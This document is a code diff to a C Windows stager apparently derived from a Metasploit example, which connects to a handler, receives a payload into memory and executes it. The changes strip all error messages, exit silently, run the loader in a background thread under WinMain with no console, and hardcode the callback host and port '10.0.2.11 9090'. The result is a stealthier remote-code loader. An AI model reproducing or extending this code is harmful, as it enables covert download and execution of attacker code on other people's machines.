@@ -10,10 +10,11 @@
  * * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
  */
 
+#include <winsock2.h>
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <windows.h>
-#include <winsock2.h>
+#include <string.h>
 
 /* init winsock */
 void winsock_init() {
@@ -23,18 +24,16 @@ void winsock_init() {
 	wVersionRequested = MAKEWORD(2, 2);
 
 	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
-		printf("ws2_32.dll is out of date.\n");
 		WSACleanup();
-		exit(1);
+		ExitProcess(2);
 	}
 }
 
 /* a quick routine to quit and report why we quit */
 void punt(SOCKET my_socket, char * error) {
-	printf("Bad things: %s\n", error);
 	closesocket(my_socket);
 	WSACleanup();
-	exit(1);
+	ExitProcess(3);
 }
 
 /* attempt to receive all of the requested data from the socket */
@@ -82,8 +81,10 @@ SOCKET wsconnect(char * targetip, int port) {
 	return my_socket;
 }
 
+int argc;
+char **argv;
 
-int main(int argc, char * argv[]) {
+DWORD threadmain(LPVOID params) { // int argc, char * argv[]) {
 	ULONG32 size;
 	char * buffer;
 	void (*function)();
@@ -91,8 +92,7 @@ int main(int argc, char * argv[]) {
 	winsock_init();
 
 	if (argc != 3) {
-		printf("%s [host] [port]\n", argv[0]);
-		exit(1);
+	  ExitProcess(1);
 	}
 
 	/* connect to the handler */
@@ -123,6 +123,62 @@ int main(int argc, char * argv[]) {
 	function = (void (*)())buffer;
 	function();
 
+	ExitProcess(0);
 	return 0;
 }
 
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+  MSG message;
+  DWORD threadID;
+  int i;
+  char *p, *c;
+
+  char *line = "10.0.2.11 9090";
+  lpCmdLine = (char *) malloc(strlen(line) + 1);
+  memcpy(lpCmdLine, line, strlen(line) + 1);
+  
+  // scan the lpCmdLine string for space-delimited fields, counting
+  // them in argc.  This will bork if you have tabs or other white-
+  // space characters as separators (spaces only!).
+
+  for(argc = 1, p = lpCmdLine; ; p++) {
+    if(*p == ' ' || *p == '\0') {
+      while(*p == ' ') p++;
+      argc++;
+    }
+    if(!*p) break;
+  }
+
+  // on the off chance that there are no arguments, then we will have
+  // incremented argc incorrectly, and we can fix it here.
+
+  if(p == lpCmdLine) argc--;
+
+  // Now that we know how many arguments there are, we can allocate
+  // space for our argv array.  lpCmdLine does not include the exe
+  // name, so I pick one that seems reasonable.
+
+  argv = (char **)malloc(sizeof(char*) * argc);
+  memset(argv, 0, sizeof(char*) * argc);
+  argv[0] = "winmain";
+
+  // With a place to put them, scan through the command line string
+  // and replace spaces (skipping extra spaces) with NULs, saving
+  // the string offsets in argv.
+
+  for(i = 1, p = c = lpCmdLine; i != argc; p++) {
+    if(*p == ' ' || *p == '\0') {
+      *p++ = '\0';
+      while(*p == ' ') p++;
+      argv[i++] = c;
+      c = p;
+    }
+  }
+
+  CreateThread(NULL, 0, threadmain, NULL, 0, &threadID);
+  
+  while(GetMessage(&message, NULL, 0, 0) > 0) {
+    TranslateMessage(&message);
+    DispatchMessage(&message);
+  }
+}
